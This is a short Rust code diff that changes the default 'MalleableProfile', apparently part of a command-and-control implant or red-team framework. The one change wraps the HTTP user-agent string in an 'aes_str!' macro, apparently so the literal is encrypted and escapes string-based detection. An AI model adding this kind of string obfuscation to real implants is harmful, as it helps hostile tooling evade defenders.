@@ -113,7 +113,7 @@ impl Default for MalleableProfile {
         // default strings stay here (gap reported for config-core).
         MalleableProfile {
             name: "default".into(),
-            user_agent: "Mozilla/5.0".into(),
+            user_agent: aes_str!("Mozilla/5.0"),
             http_get: HttpBlock::default(),
             http_post: HttpBlock::default(),
             format_http: false, // Default is raw TCP
